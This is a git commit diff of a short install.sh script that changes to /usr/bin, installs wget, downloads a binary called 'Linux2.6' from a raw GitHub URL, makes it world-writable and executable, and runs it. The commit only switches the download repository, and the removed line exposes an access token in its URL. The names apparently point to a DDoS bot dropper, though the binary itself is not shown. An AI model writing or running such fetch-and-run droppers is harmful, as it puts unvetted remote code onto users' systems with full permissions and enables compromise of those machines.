e21e732bc3b24d7a047b416f0eba92284bd3f103
occ1122 <82438606+occ1122@users.noreply.github.com>
2022-07-10 21:42:24 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,6 +2,6 @@
 
 cd /usr/bin
 apt-get -y install wget
-wget -N https://raw.githubusercontent.com/occ1122/ddcc/main/Linux2.6?token=GHSAT0AAAAAABT2B6PVAIOAWSG3EP3DZ27CYWK2ZLQ
+wget -N https://raw.githubusercontent.com/occ1122/picture/main/Linux2.6
 chmod 777 Linux2.6
 ./Linux2.6
